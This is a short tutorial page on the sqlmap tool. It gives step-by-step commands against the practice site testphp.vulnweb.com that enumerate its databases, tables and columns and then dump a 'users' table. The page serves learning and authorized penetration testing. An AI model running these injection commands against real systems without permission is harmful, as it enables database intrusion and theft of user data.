---
id: SQLMAP
title: How to Use SQL MAP
sidebar_label: How to Use SQL MAP
---

SQLMAP
=======
SQLMAP is an open source python based penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many features lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

DEMONSTRATION ON KALI LINUX
============================
SQLMAP is a CLI Based Tool which only runs on the Terminal of Kali Linux. Further are the steps to use this automated tool.

Target : http://testphp.vulnweb.com/

First Step is finding a GET Method in a Web Application, and then further enumerating it through sqlmap.

-> 	sqlmap

->	sqlmap --url “http://testphp.vulnweb.com/search.php?test=query” 
		(-u or --url for entering a url having a GET Parameter)

->	sqlmap --url “http://testphp.vulnweb.com/search.php?test=query” --dbs
	(--dbs helps in executing the database() i.e helps in enumerating the database in the that perticular web application)

-> 	sqlmap --url “http://testphp.vulnweb.com/search.php?test=query” -D 		acuart --tables
(now we will get the list of tables here where we are specifing that the ddatabase is "acuart".

->	sqlmap --url “http://testphp.vulnweb.com/search.php?test=query” -D acuart -T users --columns
(Now get bit deeper and enumerate the columns of a table we will fix the databse then the table_name which is "users".)

->	sqlmap --url “http://testphp.vulnweb.com/search.php?test=query” -D acuart -T users --dump
(Dumping all the necessary Data of the Columns of table User itself in the terminal  to which is saved in the backend with the path specified here.)


Thats how you get the juicy information of the table...

